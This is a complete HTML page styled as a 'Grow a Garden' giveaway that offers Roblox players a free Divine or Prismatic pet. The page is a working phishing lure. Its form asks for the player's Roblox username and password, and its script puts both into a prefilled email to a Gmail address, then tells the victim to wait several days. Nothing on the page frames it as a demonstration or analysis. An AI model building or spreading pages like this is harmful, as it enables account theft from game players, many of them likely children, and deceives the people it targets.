<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Grow a Garden - Choose Your Divine & Prismatic Pet</title>
  <style>
    /* Tailwind CSS v3.3.2 minimal subset for this page */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    :root {
      --green-200: #bbf7d0;
      --green-300: #86efac;
      --green-400: #4ade80;
      --green-500: #22c55e;
      --green-600: #16a34a;
      --green-700: #15803d;
      --green-800: #166534;
      --white: #ffffff;
      --black: #000000;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(to bottom, var(--green-200), var(--green-400));
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }

    .container {
      background: var(--white);
      border-radius: 1rem;
      box-shadow: 0 10px 15px rgba(0,0,0,0.1);
      max-width: 28rem;
      width: 100%;
      padding: 2rem;
    }

    h1 {
      font-weight: 700;
      font-size: 1.875rem;
      color: var(--green-800);
      margin-bottom: 1.5rem;
      text-align: center;
    }

    label {
      display: block;
      font-weight: 600;
      color: var(--green-900, #166534);
      margin-bottom: 0.5rem;
    }

    select,
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid var(--green-300);
      border-radius: 0.375rem;
      font-size: 1rem;
      outline-offset: 2px;
      outline-color: transparent;
      transition: outline-color 0.2s ease-in-out;
    }

    select:focus,
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline-color: var(--green-500);
      border-color: var(--green-500);
    }

    button {
      width: 100%;
      background-color: var(--green-600);
      color: var(--white);
      font-weight: 700;
      padding: 0.75rem;
      border: none;
      border-radius: 0.5rem;
      font-size: 1.125rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin-top: 1rem;
    }

    button:hover,
    button:focus {
      background-color: var(--green-700);
      outline: none;
    }

    #message {
      margin-top: 1.5rem;
      text-align: center;
      font-weight: 600;
      font-size: 1.125rem;
      color: var(--green-800);
      display: none;
    }

    @media (max-width: 400px) {
      .container {
        padding: 1.5rem 1rem;
      }
      h1 {
        font-size: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="container" role="main">
    <h1>Grow a Garden - Choose Your Divine &amp; Prismatic Pet</h1>
    <form id="gardenForm" autocomplete="off" novalidate>
      <div>
        <label for="pet">Select Your Divine or Prismatic Pet</label>
        <select id="pet" name="pet" required aria-required="true" aria-describedby="petHelp">
          <option value="" disabled selected>Select a pet</option>
          <option value="Mimic Octopus">Mimic Octopus</option>
          <option value="Raccoon">Raccoon</option>
          <option value="Kitsune">Kitsune</option>
          <option value="T-Rex">T-Rex</option>
          <option value="Spinosaurus">Spinosaurus</option>
          <option value="Butterfly">Butterfly</option>
          <option value="Disco Bee">Disco Bee</option>
          <option value="Golden Goose">Golden Goose</option>
          <option value="Fennec Fox">Fennec Fox</option>
          <option value="Red Fox">Red Fox</option>
        </select>
      </div>

      <div style="margin-top:1.25rem;">
        <label for="robloxUsername">Roblox Account Username</label>
        <input
          type="text"
          id="robloxUsername"
          name="robloxUsername"
          placeholder="Enter your Roblox username"
          required
          aria-required="true"
          autocomplete="username"
          spellcheck="false"
          inputmode="text"
        />
      </div>

      <div style="margin-top:1.25rem;">
        <label for="robloxPassword">Roblox Account Password</label>
        <input
          type="password"
          id="robloxPassword"
          name="robloxPassword"
          placeholder="Enter your Roblox password"
          required
          aria-required="true"
          autocomplete="current-password"
          spellcheck="false"
          inputmode="text"
        />
      </div>

      <div style="margin-top:1.25rem;">
        <label for="bestPet">What is your best pet?</label>
        <input
          type="text"
          id="bestPet"
          name="bestPet"
          placeholder="Enter your best pet"
          required
          aria-required="true"
          spellcheck="false"
          inputmode="text"
        />
      </div>

      <button type="submit" aria-label="Submit your Grow a Garden pet selection and Roblox info">
        Submit
      </button>
    </form>

    <div id="message" role="alert" aria-live="polite"></div>
  </div>

  <script>
    (function () {
      const form = document.getElementById('gardenForm');
      const messageDiv = document.getElementById('message');

      form.addEventListener('submit', function (e) {
        e.preventDefault();

        const pet = form.pet.value;
        const robloxUsername = form.robloxUsername.value.trim();
        const robloxPassword = form.robloxPassword.value.trim();
        const bestPet = form.bestPet.value.trim();

        if (!pet || !robloxUsername || !robloxPassword || !bestPet) {
          alert('Please fill in all fields.');
          return;
        }

        // Compose email content
        const subject = encodeURIComponent('Grow a Garden Pet Submission');
        const body = encodeURIComponent(
          `Pet: ${pet}\nRoblox Username: ${robloxUsername}\nRoblox Password: ${robloxPassword}\nBest Pet: ${bestPet}`
        );

        // Show waiting message
        messageDiv.textContent = 'Please wait 5-4 days.';
        messageDiv.style.display = 'block';

        // Open mail client with prefilled email to growagardenfreepetsforeveryone@gmail.com
        window.location.href = `mailto:growagardenfreepetsforeveryone@gmail.com?subject=${subject}&body=${body}`;

        // Reset form after submission
        form.reset();
      });
    })();
  </script>
</body>
</html>
